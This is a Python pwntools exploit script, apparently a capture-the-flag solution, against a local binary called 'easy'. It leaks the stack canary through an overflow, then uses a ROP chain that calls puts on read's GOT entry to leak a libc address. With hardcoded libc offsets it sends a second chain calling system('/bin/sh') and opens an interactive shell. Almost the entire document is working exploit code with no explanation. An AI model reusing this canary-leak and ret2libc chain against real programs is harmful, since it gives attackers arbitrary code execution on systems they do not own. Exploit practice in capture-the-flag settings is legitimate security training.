#!/usr/bin/python
from pwn import *
#context.log_level = 'debug'
p = process('easy')
p.recvuntil('you?\n')

raw_input("="*20+"leak-canary"+"="*20)
p.sendline("A"*72)
p.recvuntil("AAAA\n")
canary = u64('\x00'+p.recv(7))
log.success("canary = " + hex(canary))

# puts(read)
puts_plt = 0x0400560
read_got = 0x0601030
poprdi   = 0x04007F3
main     = 0x04006C6
'''
0080| 0x7ffdbdcc23d8 --> 0xdf38bd5406b4af0a        # canary
0088| 0x7ffdbdcc23e0 --> 0x0                       # rbp
0096| 0x7ffdbdcc23e8 --> <__libc_start_main+245>   # ret
'''
payload1 = (
	    "A" * 72,
	    p64(canary),
	    p64(0x0),
	    p64(poprdi),
	    p64(read_got),
	    p64(puts_plt),
	    p64(main)
	    )
payload1 = ''.join(payload1)
raw_input("="*20+"payload1"+"="*20)
p.sendline(payload1)
p.recvuntil('again!\n')
read = u64(p.recv().split('\nHello')[0].ljust(8,'\x00'))
log.success("read = " + hex(read))

#from libc-database
offset_system = 0x0000000000046590
offset_read = 0x00000000000eb6a0
offset_str_bin_sh = 0x17c8c3

system = read - offset_read + offset_system
binsh  = read - offset_read + offset_str_bin_sh
log.success("system = " + hex(system))
log.success("binsh = " + hex(binsh))

p.sendline("yourdaddy")
p.recvuntil("name?\n")
# system(binsh)
payload2 = (
        "A" * 72,
        p64(canary),
        p64(0x0),
        p64(poprdi),
        p64(binsh),
        p64(system),
        p64(main)
        )
payload2 = ''.join(payload2)
raw_input("="*20+"payload2"+"="*20)
p.sendline(payload2)
p.recvuntil("again!\n")

p.interactive()